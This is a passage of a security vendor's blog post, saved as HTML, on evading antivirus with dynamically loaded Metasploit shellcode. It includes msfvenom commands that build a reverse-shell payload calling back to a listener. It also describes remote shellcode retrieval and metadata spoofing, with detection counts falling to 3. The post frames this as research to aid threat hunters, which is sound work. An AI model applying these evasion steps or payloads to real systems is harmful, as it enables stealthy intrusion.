@@ -1,0 +1,1169 @@
+<!doctype html>
+<html class="no-js" lang="">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="apple-touch-icon" sizes="152x152" href="/favicon/favicon-152x152.png">
+    <link rel="apple-touch-icon" sizes="167x167" href="/favicon/favicon-167x167.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon/favicon-16x16.png">
+    <link rel="manifest" href="/favicon/site.webmanifest">
+    <link rel="mask-icon" href="/favicon/safari-pinned-tab.svg" color="#ffffff">
+    <link rel="shortcut icon" href="/favicon/favicon.ico">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-config" content="/favicon/browserconfig.xml">
+    <meta name="theme-color" content="#ffffff">
+
+    <link rel="alternate" hreflang="en" href="https://blog.f-secure.com/dynamic-shellcode-execution/" />
+
+	<!-- This site is optimized with the Yoast SEO plugin v14.9 - https://yoast.com/wordpress/plugins/seo/ -->
+	<title>Dynamic Shellcode Execution - F-Secure Blog</title>
+	<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+	<link rel="canonical" href="https://blog.f-secure.com/dynamic-shellcode-execution/" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="article" />
+	<meta property="og:title" content="Dynamic Shellcode Execution - F-Secure Blog" />
+	<meta property="og:description" content="Introduction Antivirus solutions are commonly used to detect malicious files and often rely on static analysis to separate the good from the bad. This approach works if the file itself contains something malicious but what happens if an attacker uses a light-weight stager to instead download and load code into memory on-the-fly? It turns out [&hellip;]" />
+	<meta property="og:url" content="https://blog.f-secure.com/dynamic-shellcode-execution/" />
+	<meta property="og:site_name" content="F-Secure Blog" />
+	<meta property="article:published_time" content="2019-03-12T11:09:54+00:00" />
+	<meta property="article:modified_time" content="2019-09-19T13:22:46+00:00" />
+	<meta property="og:image" content="https://blog-assets.f-secure.com/wp-content/uploads/2019/09/13165830/business-office-reflection-stretching-man-1940x970.jpg" />
+	<meta property="og:image:width" content="1940" />
+	<meta property="og:image:height" content="970" />
+	<meta name="twitter:card" content="summary_large_image" />
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://blog.f-secure.com/#website","url":"https://blog.f-secure.com/","name":"F-Secure Blog","description":"","potentialAction":[{"@type":"SearchAction","target":"https://blog.f-secure.com/?s={search_term_string}","query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"ImageObject","@id":"https://blog.f-secure.com/dynamic-shellcode-execution/#primaryimage","inLanguage":"en-US","url":"https://blog-assets.f-secure.com/wp-content/uploads/2019/09/13165830/business-office-reflection-stretching-man-1940x970.jpg","width":1940,"height":970,"caption":"F-Secure, 2019."},{"@type":"WebPage","@id":"https://blog.f-secure.com/dynamic-shellcode-execution/#webpage","url":"https://blog.f-secure.com/dynamic-shellcode-execution/","name":"Dynamic Shellcode Execution - F-Secure Blog","isPartOf":{"@id":"https://blog.f-secure.com/#website"},"primaryImageOfPage":{"@id":"https://blog.f-secure.com/dynamic-shellcode-execution/#primaryimage"},"datePublished":"2019-03-12T11:09:54+00:00","dateModified":"2019-09-19T13:22:46+00:00","author":{"@id":"https://blog.f-secure.com/#/schema/person/51c3d10633c0eab90d5bdcf489bd4417"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://blog.f-secure.com/dynamic-shellcode-execution/"]}]},{"@type":"Person","@id":"https://blog.f-secure.com/#/schema/person/51c3d10633c0eab90d5bdcf489bd4417","name":"Noora Hyv\u00e4rinen","image":{"@type":"ImageObject","@id":"https://blog.f-secure.com/#personlogo","inLanguage":"en-US","url":"https://secure.gravatar.com/avatar/1ef5b1b134c196b7cfa8d09d377d28b3?s=96&d=mm&r=g","caption":"Noora Hyv\u00e4rinen"}}]}</script>
+	<!-- / Yoast SEO plugin. -->
+
+
+<link rel='dns-prefetch' href='//ajax.googleapis.com' />
+<link rel='dns-prefetch' href='//cdnjs.cloudflare.com' />
+<link rel='dns-prefetch' href='//oneblogauthors.f-secure.com' />
+<link rel='dns-prefetch' href='//use.fontawesome.com' />
+<link rel='dns-prefetch' href='//s3.eu-central-1.amazonaws.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel='stylesheet' id='wp-block-library-css'  href='https://blog.f-secure.com/wp-includes/css/dist/block-library/style.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='font-awesome-css'  href='https://use.fontawesome.com/releases/v5.0.6/css/all.css' type='text/css' media='all' />
+<link rel='stylesheet' id='swiss-css-css'  href='https://blog.f-secure.com/wp-content/themes/swiss/assets/dist/css/bundle.css?v=1600334030' type='text/css' media='all' />
+<link rel='stylesheet' id='new-fsecure-css-css'  href='https://s3.eu-central-1.amazonaws.com/evermade-fsecure-assets/wp-content/uploads/css/blog-new-brand-overwrite.css' type='text/css' media='all' />
+<script type='text/javascript' src='//ajax.googleapis.com/ajax/libs/jquery/1.12.0/jquery.min.js' id='jquery-js'></script>
+<script type='text/javascript' src='//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js' id='modernizr-js'></script>
+<meta name="generator" content="WPML ver:4.3.19 stt:38,1,18,4,3,27,28,2;" />
+
+    <script>
+    if (window.jQuery) {
+        if(!window.$) $ = jQuery;
+    }
+    </script>
+
+    <script>
+    var fsData = [{
+        page: {
+            pageInfo: {
+                pageName: "dynamic-shellcode-execution",
+                geoRegion: "global",
+                language: "en"
+            },
+            category: {
+                primaryCategory: "blog"
+            }
+        }
+    }];
+    </script>
+
+    <meta name="google-site-verification" content="30P5dC3g0RF8s3M0hRFAji035x65l--RuQWj-1S6SGE" />
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','fsData','GTM-P9PC2DD');</script>
+<!-- End Google Tag Manager -->
+</head>
+<body class="post-template-default single single-post postid-18413 single-format-standard">
+
+    <!--[if lt IE 8]>
+        <div class="c-chromeframe">
+            You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.
+        </div>
+    <![endif]-->
+
+<a href="#content" class="h-accessability js-skip-to-content">Skip to content</a>
+
+<header class="b-header js-header">
+    <div class="b-header__top">
+        <div class="b-header__container">
+
+            <div class="b-header__logo">
+                <div class="c-site-logo">
+    <a href="https://blog.f-secure.com" title="F-Secure Blog">
+        
+<!-- Generator: Adobe Illustrator 21.1.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 viewBox="0 0 841.9 245.3" style="enable-background:new 0 0 841.9 245.3;" xml:space="preserve">
+<g>
+	<g>
+		<g>
+			<path d="M600.5,198.3c0-2-1-3-4.2-3c-0.9,0-2.1,0.1-2.8,0.2v8.8h2.1v-3h0.9l1.6,3h2.5l-2.1-3.4
+				C599.7,200.5,600.5,199.6,600.5,198.3z M596.4,199.8h-0.7V197c0.2,0,0.5,0,0.7,0c1.8,0,2,0.4,2,1.4
+				C598.4,199.4,597.9,199.8,596.4,199.8z"/>
+			<path d="M596.9,191c-5.9,0-8.9,3-8.9,8.9c0,5.9,3,8.9,8.9,8.9c5.9,0,8.9-3,8.9-8.9C605.8,194.1,602.8,191,596.9,191z
+				 M596.9,207.1c-5.2,0-7.2-1.9-7.2-7.2c0-5.3,2-7.2,7.2-7.2c5.1,0,7.2,1.9,7.2,7.2C604.1,205.2,602,207.1,596.9,207.1z"/>
+			<path d="M9.8,110.7c0-1.5,0.3-1.8,1.8-1.8h58.2c1.5,0,1.8,0.3,1.8,1.8v17.5c0,1.5-0.3,1.8-1.8,1.8H33.7v21.3h30.1
+				c1.5,0,1.8,0.3,1.8,1.8v17.2c0,1.5-0.3,1.8-1.8,1.8H33.7v33.1c0,1.5-0.3,1.8-1.8,1.8H11.6c-1.5,0-1.8-0.3-1.8-1.8V110.7z"/>
+			<path d="M82.7,172.3c-1.5,0-1.8-0.3-1.8-1.8v-17.2c0-1.5,0.3-1.8,1.8-1.8h29.8c1.5,0,1.8,0.3,1.8,1.8v17.2c0,1.5-0.3,1.8-1.8,1.8
+				H82.7z"/>
+			<path d="M147.7,135.7c0,6.5,3.8,7.8,18.5,12.1c21,6.1,28.8,14.2,28.8,30.6c0,21.3-17.9,30.4-38.2,30.4c-11.6,0-22.6-3.3-28.9-6.8
+				c-1-0.5-1.5-1-1.5-2.3v-12.9c0-1.1,0.3-1.5,1.3-1.5c2.1,0,15,3.6,27.4,3.6c11.1,0,16.2-2.6,16.2-9.3c0-6.6-4.6-8.4-17.7-11.9
+				c-22-6-29.4-14.1-29.4-30.4c0-19.3,15.6-30.1,34.6-30.1c11.1,0,20,2.3,28.6,6.8c1.2,0.7,1.5,1,1.5,2.3v12.9
+				c0,1.2-0.7,1.5-1.5,1.5c-2.8,0-14.4-3.6-27.3-3.6C151.1,127.1,147.7,130.6,147.7,135.7z"/>
+			<path d="M228,176.4c0.8,10.6,6.6,13.6,19.3,13.6c12.7,0,22.3-3.2,24.6-3.2c1,0,1.5,0.2,1.5,1.5v12.2c0,1.5-0.7,1.8-1.8,2.3
+				c-6.9,3-16.9,6-28.8,6c-24.3,0-38.4-11.1-38.4-38.2c0-25.6,13.9-39.5,37.4-39.5c26.5,0,34.7,15.9,34.7,37.4v6.1
+				c0,1.5-0.3,1.8-1.8,1.8H228z M227.9,163.2h26.5c0-10.7-3.5-15-12.4-15C233.8,148.1,228.4,152.4,227.9,163.2z"/>
+			<path d="M323.6,131.1c9.4,0,18.8,2.8,25.1,5.8c1.5,0.7,1.7,1,1.7,2.5v11.9c0,0.8-0.2,1.5-1.2,1.5c-2.3,0-11.2-2.8-21.7-2.8
+				c-12.9,0-17.7,6.9-17.7,20c0,13.1,4.8,20,17.7,20c10.4,0,20-3.2,22.3-3.2c1,0,1.2,0.7,1.2,1.5v12.2c0,1.5-0.2,1.8-1.7,2.5
+				c-6.3,3-16.4,5.8-25.8,5.8c-25.6,0-37.4-15.9-37.4-38.9C286.2,147,298,131.1,323.6,131.1z"/>
+			<path d="M398.4,208.8c-20.3,0-35.7-6.4-35.7-30.3v-44.3c0-1.5,0.3-1.8,1.8-1.8h19.8c1.5,0,1.8,0.3,1.8,1.8v41.2
+				c0,10.1,3.3,14.5,13.4,14.5c4.1,0,8.3-0.2,11.4-0.5v-55.3c0-1.5,0.3-1.8,1.8-1.8h19.8c1.5,0,1.8,0.3,1.8,1.8v68.7
+				c0,1.5-0.2,1.7-1.3,2C423.4,207.2,410.3,208.8,398.4,208.8z"/>
+			<path d="M485.4,150.4c-4.3,0-8.4,0.5-10.9,1.5v53.4c0,1.5-0.3,1.8-1.8,1.8h-19.8c-1.5,0-1.8-0.3-1.8-1.8v-66.2
+				c0-1.2,0.5-1.7,1.5-2c8.9-3.5,18.3-6.1,28.9-6.1c6.3,0,12.4,0.5,17.9,2.1c1,0.3,1.2,0.7,1.2,1.7v14.9c0,1.5-0.5,1.6-1.5,1.6
+				C497.1,151.4,492.8,150.4,485.4,150.4z"/>
+			<path d="M528.9,176.4c0.8,10.6,6.6,13.6,19.3,13.6c12.7,0,22.3-3.2,24.6-3.2c1,0,1.5,0.2,1.5,1.5v12.2c0,1.5-0.6,1.8-1.8,2.3
+				c-7,3-16.9,6-28.8,6c-24.3,0-38.4-11.1-38.4-38.2c0-25.6,13.9-39.5,37.4-39.5c26.5,0,34.7,15.9,34.7,37.4v6.1
+				c0,1.5-0.3,1.8-1.8,1.8H528.9z M528.7,163.2h26.5c0-10.7-3.5-15-12.4-15C534.6,148.1,529.2,152.4,528.7,163.2z"/>
+		</g>
+		<path d="M830.6,31.8C754.9,5.4,675.4,4.2,605.2,25.7c-15,4.6-19,17.2-16.4,27.9c4,16.3,9.9,34.9,17,51.8c0.1,0.3,0.3,0.2,0.3-0.3
+			c-0.9-7.9,5.1-17.9,17.1-21.6c66.5-20.2,124.6-15.2,176.3,2.3c8.7,3,18.5-1.7,21.3-10.7c7.1-22.8,10-38.4,10.7-42.2"/>
+		<g>
+			<path d="M655.4,81.9c-8.8,1.9-20.8,4.7-29.8,7.8c-18.1,6.2-17.3,28.1-7.6,35.2c0.7-4.1,5-9.6,9.9-11.5c18.1-7,37.4-11.3,57-13
+				C675,96.3,665.2,90.5,655.4,81.9z"/>
+		</g>
+		<path d="M799.2,126c-52.2-25-115.1-26.8-166.9-6.7c-8.5,3.3-14,13.7-8.5,23.7c8.7,15.8,19.5,32.6,31.9,48.7
+			c-1.7-5.9,1.3-16.9,12.9-20.5c31.9-9.8,65.4-5.7,87.8,3.3c6.3,2.6,15.1,1,20.2-6.5c11-16.5,21-36.3,23.2-40.7
+			C800.1,126.8,799.8,126.3,799.2,126z"/>
+		<g>
+			<path d="M747.4,204.8c-5.7-1.6-19.8-12.7-25.3-18.2c-3.5-3.5-8.5-8.4-13.9-14.3c-12.2,0-24.1,1.3-36.7,5.3
+				c-11.7,3.7-12.8,17.4-7.7,24.4c8.8,10.8,14.8,16.8,24.6,26.8c10.2,10.5,28.3,10.8,38.8,0.2c7.6-7.7,12.3-12.7,20.9-22.4
+				C748.4,205.9,748.2,205,747.4,204.8z"/>
+		</g>
+	</g>
+</g>
+</svg>
+        <span class="c-site-logo__text">BLOG</span>
+    </a>
+</div>
+            </div>
+
+            <div class="b-header__tools">
+                                <div class="b-header__external-link">
+                    <a href="https://www.f-secure.com/">
+                        F-Secure.com                    </a>
+                </div>
+                <div class="b-header__about">
+                    <a href="https://blog.f-secure.com/about-this-blog/">About This Blog</a>                </div>
+                                <div class="b-header__search js-search-trigger js-search-trigger-peek">
+                    Search                </div>
+                <div class="b-header__language">
+                    
+
+<div class="c-language-selector js-language-selector">
+
+    <span class="c-language-selector__current">
+		<span>en</span>                    <i class="fa fa-angle-down"></i>
+            </span>
+
+    <div class="c-language-selector__list js-language-selector-list">
+        
+        <ul>
+                                                                            <li>
+                        <a href="https://blog.f-secure.com/fi/">
+                            Suomi                        </a>
+                    </li>
+                                                                <li>
+                        <a href="https://blog.f-secure.com/fr/">
+                            Français                        </a>
+                    </li>
+                                                                <li>
+                        <a href="https://blog.f-secure.com/de/">
+                            Deutsch                        </a>
+                    </li>
+                                                                <li>
+                        <a href="https://blog.f-secure.com/it/">
+                            Italiano                        </a>
+                    </li>
+                                                                <li>
+                        <a href="https://blog.f-secure.com/es/">
+                            Español                        </a>
+                    </li>
+                                                                <li>
+                        <a href="https://blog.f-secure.com/nl/">
+                            Nederlands                        </a>
+                    </li>
+                                                                <li>
+                        <a href="https://blog.f-secure.com/ja/">
+                            日本語                        </a>
+                    </li>
+                                    </ul>
+
+            </div>
+
+</div>
+
+                </div>
+                <div class="b-header__menu-toggle">
+                    <div class="c-menu-toggle js-header-toggle">
+    <div class="c-menu-toggle__icon">
+        <div></div>
+        <div></div>
+        <div></div>
+    </div>
+</div>                </div>
+            </div>
+
+        </div>
+    </div>
+
+        <div class="b-header__menu">
+        <div class="b-header__container">
+
+            <div class="b-header__showall">
+                <a class="c-btn js-sidemenu-toggle" href="#">
+                    <span data-open="Trending tags" data-close="Close">Trending tags</span>
+                    <i data-open="fa-bars" data-close="fa-times-circle" class="fa fa-bars"></i>
+                </a>
+            </div>
+
+            <nav>
+                <div class="c-header-menu-desktop"><ul id="menu-main-navigation" class="c-header-menu-desktop__list"><li id="menu-item-18090" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-18090"><a href="https://blog.f-secure.com/category/business-security/">Business Security</a></li>
+<li id="menu-item-18089" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-18089"><a href="https://blog.f-secure.com/category/home-security/">Home Security</a></li>
+<li id="menu-item-18091" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-18091"><a href="https://blog.f-secure.com/category/threats-research/">Threats &#038; Research</a></li>
+<li id="menu-item-18566" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-18566"><a href="https://blog.f-secure.com/category/f-secure-life/">F-Secure Life</a></li>
+<li id="menu-item-18093" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-18093"><a href="https://blog.f-secure.com/category/podcasts/">Podcasts</a></li>
+<li id="menu-item-18094" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-18094"><a href="https://blog.f-secure.com/category/videos/">Videos</a></li>
+<li id="menu-item-41889" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-41889"><a href="https://blog.f-secure.com/whitepapers/">Whitepapers</a></li>
+</ul></div>            </nav>
+        </div>
+    </div>
+    
+    <div class="b-header__progress js-article-progress"></div>
+
+    <div class="b-header__search-bar">
+        
+    <!-- FOR NAVIGATION -->
+
+    <div class="c-search-bar js-search-bar">
+        <div class="c-search-bar__container">
+            <div class="c-search-bar__wrapper">
+
+                <form action="https://blog.f-secure.com/search/">
+
+                    <input class="js-search-bar-input" type="text" name="query" placeholder="Type your search here">
+
+                    <button type="submit" class="c-btn c-btn--search js-search-bar-submit">
+                        Search                    </button>
+
+                </form>
+
+                <p class="c-search-bar__close js-search-trigger">
+                    Close                </p>
+
+            </div>
+        </div>
+    </div>
+
+    </div>
+
+    <div class="b-header__mobile-navigation">
+
+        <div class="l-mobile-navigation">
+            <div class="l-mobile-navigation__menu">
+                <div class="c-header-menu-mobile"><ul id="menu-main-navigation-1" class="c-header-menu-mobile__list"><li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-18090"><a href="https://blog.f-secure.com/category/business-security/">Business Security</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-18089"><a href="https://blog.f-secure.com/category/home-security/">Home Security</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-18091"><a href="https://blog.f-secure.com/category/threats-research/">Threats &#038; Research</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-18566"><a href="https://blog.f-secure.com/category/f-secure-life/">F-Secure Life</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-18093"><a href="https://blog.f-secure.com/category/podcasts/">Podcasts</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-18094"><a href="https://blog.f-secure.com/category/videos/">Videos</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-41889"><a href="https://blog.f-secure.com/whitepapers/">Whitepapers</a></li>
+</ul></div>            </div>
+            <div class="l-mobile-navigation__tools">
+                <div class="l-mobile-navigation__search">
+                    <a href="https://blog.f-secure.com/search">
+                        Search                    </a>
+                </div>
+                <div class="l-mobile-navigation__language">
+                    
+
+<div class="c-language-selector js-language-selector c-language-selector--list-up">
+
+    <span class="c-language-selector__current">
+		<span>en</span>                    <i class="fa fa-angle-down"></i>
+            </span>
+
+    <div class="c-language-selector__list js-language-selector-list">
+        
+        <ul>
+                                                                            <li>
+                        <a href="https://blog.f-secure.com/fi/">
+                            Suomi                        </a>
+                    </li>
+                                                                <li>
+                        <a href="https://blog.f-secure.com/fr/">
+                            Français                        </a>
+                    </li>
+                                                                <li>
+                        <a href="https://blog.f-secure.com/de/">
+                            Deutsch                        </a>
+                    </li>
+                                                                <li>
+                        <a href="https://blog.f-secure.com/it/">
+                            Italiano                        </a>
+                    </li>
+                                                                <li>
+                        <a href="https://blog.f-secure.com/es/">
+                            Español                        </a>
+                    </li>
+                                                                <li>
+                        <a href="https://blog.f-secure.com/nl/">
+                            Nederlands                        </a>
+                    </li>
+                                                                <li>
+                        <a href="https://blog.f-secure.com/ja/">
+                            日本語                        </a>
+                    </li>
+                                    </ul>
+
+            </div>
+
+</div>
+
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+</header>
+
+<div class="b-sidemenu">
+    <div class="b-sidemenu__wrapper">
+        <h4>Trending tags</h4>
+
+                    <ul class="c-trending-tags">
+                                    <li><a href="https://blog.f-secure.com/tag/advanced-threat-protection-en/">Advanced Threat Protection</a></li>
+                                    <li><a href="https://blog.f-secure.com/ja/tag/artificial-intelligence-jp/">AI</a></li>
+                                    <li><a href="https://blog.f-secure.com/tag/best-practice-en/">Best Practice</a></li>
+                                    <li><a href="https://blog.f-secure.com/tag/cyber-threat-landscape/">Cyber Threat Landscape</a></li>
+                                    <li><a href="https://blog.f-secure.com/tag/data-breach-en/">Data Breach</a></li>
+                                    <li><a href="https://blog.f-secure.com/tag/digital-parenting-en/">Digital Parenting</a></li>
+                                    <li><a href="https://blog.f-secure.com/tag/iot/">IoT</a></li>
+                                    <li><a href="https://blog.f-secure.com/tag/privacy-en/">Privacy</a></li>
+                                    <li><a href="https://blog.f-secure.com/tag/ransomware-en/">Ransomware</a></li>
+                                    <li><a href="https://blog.f-secure.com/tag/smart-home-en/">Smart Home</a></li>
+                                    <li><a href="https://blog.f-secure.com/tag/social-media-en/">Social Media</a></li>
+                            </ul>
+            </div>
+</div>
+
+<div id="content" class="b-page-content b-page-content--offset">
+
+
+<div class="s-context--inverted">
+
+    <div class="b-single-header">
+
+    <div class="c-background-image" style="background-image: url(https://blog-assets.f-secure.com/wp-content/uploads/2019/09/13165830/business-office-reflection-stretching-man-1940x970-1024x512.jpg);"></div>
+    <div class="c-overlay"></div>
+
+    <div class="b-single-header__container">
+
+        <div class="b-single-header__content">
+
+            <!-- categories -->
+            <div class="b-single-header__categories">
+                <div class="c-category-list">
+                    <a href="https://blog.f-secure.com/category/threats-research/" rel="category tag">Threats &amp; Research</a>                </div>
+            </div>
+
+            <h1>Dynamic Shellcode Execution</h1>
+
+            <!-- author -->
+            
+
+    <div class="c-blog-author">
+
+        <div class="c-blog-author__avatar">
+            <a href="https://blog.f-secure.com/author/noorah/">
+                <img src="https://blog-assets.f-secure.com/wp-content/uploads/2018/07/02055722/Blog-picture.png" alt="">            </a>
+        </div>
+
+        <div class="c-blog-author__text">
+            <h5>
+                <a href="https://blog.f-secure.com/author/noorah/">
+                    Noora Hyvärinen                </a>
+            </h5>
+            <p class="c-blog-author__time">
+                <span>12.03.19</span>
+                <span>9 min. read</span>
+            </p>
+        </div>
+
+    </div>
+
+
+        </div>
+
+        <div class="b-single-header__tags">
+            <strong>Tags: </strong><a href="https://blog.f-secure.com/tag/f-secure-countercept/" rel="tag">F-Secure Countercept</a><a href="https://blog.f-secure.com/tag/managed-detection-and-response/" rel="tag">Managed Detection and Response</a>        </div>
+
+        <div class="b-single-header__sharing" data-scheme-target>
+            <div class="c-share c-share--vertical">
+    <h5 class="c-share__title">Share</h5>
+    <ul class="c-share__list">
+                    <li>
+                <a href="http://twitter.com/share?url=https://SHARE_SITE_URL/dynamic-shellcode-execution/&text=Dynamic+Shellcode+Execution" title="Share on Twitter" data-some-link="twitter" class="twitter">
+                    <i class="fab fa-twitter"></i>
+                </a>
+            </li>
+                    <li>
+                <a href="https://www.linkedin.com/shareArticle?mini=true&url=https://SHARE_SITE_URL/dynamic-shellcode-execution/&source=Dynamic+Shellcode+Execution" title="Share on Linkedin" data-some-link="linkedin" class="linkedin">
+                    <i class="fab fa-linkedin-in"></i>
+                </a>
+            </li>
+                    <li>
+                <a href="http://www.facebook.com/sharer/sharer.php?u=https://SHARE_SITE_URL/dynamic-shellcode-execution/" title="Share on Facebook" data-some-link="facebook" class="facebook">
+                    <i class="fab fa-facebook-f"></i>
+                </a>
+            </li>
+            </ul>
+</div>
+        </div>
+
+    </div>
+</div>
+
+</div>
+
+<div class="s-context">
+
+    <section class="b-blog b-blog--space-above">
+        <div class="b-blog__container">
+
+            <div class="l-blog">
+                <div class="l-blog__content">
+
+                    
+                    <div class="h-wysiwyg-html">
+                        <article class="c-article" data-scheme-target>
+                            <h4>Introduction</h4>
+<p>Antivirus solutions are commonly used to detect malicious files and often rely on static analysis to separate the good from the bad. This approach works if the file itself contains something malicious but what happens if an attacker uses a light-weight stager to instead download and load code into memory on-the-fly? It turns out this is a great way to bypass antivirus.</p>
+<p>While this approach isn’t new and bypassing antivirus is common for most modern malware we wanted to provide some insights into the steps taken when building such a payload and also show how threat hunters can detect such activity at scale with common EDR tools.</p>
+<p>In this post we’ll be using VirusTotal as our benchmark and Metasploit reverse tcp shellcode as our payload. This provides a rough way to measure the effectiveness of our payloads, however do remember dynamic or behavior-based detection may catch the payload in the real-world.</p>
+<h4>Msfvenom File Creation</h4>
+<p>Starting with the basics we first used msfvenom to create a reverse shell executable payload with the below one-liner:</p>
+<pre>msfvenom –p windows/meterpreter/reverse_tcp LHOST=172.16.28.216 LPORT=4444 –f exe –o met.exe</pre>
+<p>Uploading this file to VirusTotal it was flagged by a large number of engines, which made sense given that it’s a common payload and Metasploit is well-known by security vendors.</p>
+<p><a href="https://www.countercept.com/assets/Uploads/1-dynamic-shellcode-download-vt1.png" target="_blank" rel="noopener noreferrer"><img loading="lazy" class="leftAlone" title="" src="https://blog-assets.f-secure.com/wp-content/uploads/2019/09/17141540/1-dynamic-shellcode-download-vt1.png" alt="1 dynamic shellcode download vt1" width="600" height="414" /></a></p>
+<p>Given the number of engines that mark the file as malicious any defensive team that review AV alerts or VirusTotal enriched EDR process data will have this swiftly raise up their workflow. Additionally, the names of some of the engine hits, such as ‘Trojan:win32/Meterpreter.O’ give a very good indication about the nature of the file.</p>
+<h4>Embedded Meterpreter Shellcode</h4>
+<p>Given that most antivirus vendors probably have signatures for Metasploit executable templates we decided to instead create our own executable to execute Metasploit shellcode. Once again, msfvenom was used, but in this instance only to generate shellcode and not the full executable:</p>
+<pre>msfvenom –p windows/meterpreter/reverse_tcp LHOST=172.16.28.216 LPORT=4444 –f c</pre>
+<p><a href="https://www.countercept.com/assets/Uploads/2-dynamic-shellcode-download-code1.png" target="_blank" rel="noopener noreferrer"><img loading="lazy" class="leftAlone" title="" src="https://blog-assets.f-secure.com/wp-content/uploads/2019/09/17141543/2-dynamic-shellcode-download-code1.png" alt="2 dynamic shellcode download code1" width="491" height="308" /></a></p>
+<p>By simply copying the shellcode into a separate C++ source file, in which the instructions are loaded into memory by calling memcpy, significantly reduced the number of VirusTotal hits from 45 to 14.</p>
+<p><a href="https://www.countercept.com/assets/Uploads/3-dynamic-shellcode-download-vt2.png" target="_blank" rel="noopener noreferrer"><img loading="lazy" class="leftAlone" title="" src="https://blog-assets.f-secure.com/wp-content/uploads/2019/09/17141549/3-dynamic-shellcode-download-vt2.png" alt="3 dynamic shellcode download vt2" width="600" height="409" /></a></p>
+<p>This reduction showed antivirus signatures were strongly coupled to the Metasploit executable templates. There are, however, further ways to reduce the number of VirusTotal engines that mark the file malicious.</p>
+<h4>Remotely Hosted Shellcode</h4>
+<p>The third technique that was tested involved dynamically loading the shellcode. Instead of compiling an executable with the shellcode already written into the binary, it would retrieve and load the shellcode into memory at runtime.</p>
+<p>A function called get_shellcode() was created to remotely retrieve the msfvenom shellcode used in the previous examples from another machine. The function used various methods from the winhttp library to retrieve the shellcode over HTTP. Also as the shellcode is retrieved from the remote location as ASCII an additional step was needed to cast the instructions to raw binary format ready for execution.</p>
+<p><a href="https://www.countercept.com/assets/Uploads/4-dynamic-shellcode-download-code2.png" target="_blank" rel="noopener noreferrer"><img loading="lazy" class="leftAlone" title="" src="https://blog-assets.f-secure.com/wp-content/uploads/2019/09/17141554/4-dynamic-shellcode-download-code2.png" alt="4 dynamic shellcode download code2" width="600" height="560" /></a></p>
+<p>This yielded another reduction in the VirusTotal hits going from 14 down to 5 showing that some engines were likely using signatures based on Metasploit shellcode patterns. With the shellcode removed from the binary itself it was now able to bypass these engines.</p>
+<p><a href="https://www.countercept.com/assets/Uploads/5-dynamic-shellcode-download-vt3.png" target="_blank" rel="noopener noreferrer"><img loading="lazy" class="leftAlone" title="" src="https://blog-assets.f-secure.com/wp-content/uploads/2019/09/17141559/5-dynamic-shellcode-download-vt3.png" alt="5 dynamic shellcode download vt3" width="600" height="425" /></a></p>
+<h4>Meta-Data Alteration</h4>
+<p>Some AV engines consult a file’s metadata to draw conclusions on its origin and reputation. Visual Studio provides an easy way to change the metadata allowing us to modify the binary attributes to match those of a reputable software provider. The only step required was to add a ‘Version’ resource to the project and copy the entries from a legitimate executable.</p>
+<p><a href="https://www.countercept.com/assets/Uploads/6-dynamic-shellcode-download-file-metadata.png" target="_blank" rel="noopener noreferrer"><img loading="lazy" class="leftAlone" title="" src="https://blog-assets.f-secure.com/wp-content/uploads/2019/09/17141607/6-dynamic-shellcode-download-file-metadata.png" alt="6 dynamic shellcode download file metadata" width="600" height="761" /></a></p>
+<p>The metadata for cmd.exe was copied into the editable fields and the binary resubmitted to VirusTotal. This step reduced the number of VirusTotal detections to just 3. This implied that certain engines will apply a legitimacy weighting to a file that looks to originate from a reputable publisher based on the metadata.</p>
+<p><a href="https://www.countercept.com/assets/Uploads/7-dynamic-shellcode-download-vt4.png" target="_blank" rel="noopener noreferrer"><img loading="lazy" class="leftAlone" title="" src="https://blog-assets.f-secure.com/wp-content/uploads/2019/09/17141611/7-dynamic-shellcode-download-vt4.png" alt="7 dynamic shellcode download vt4" width="600" height="260" /></a></p>
+<h4>Alternative HTTP Functions (the final piece of the puzzle)</h4>
+<p>Despite removing Metasploit templates and shellcode and adding metadata the payload was still being caught. What was missing in order to get to zero detections?</p>
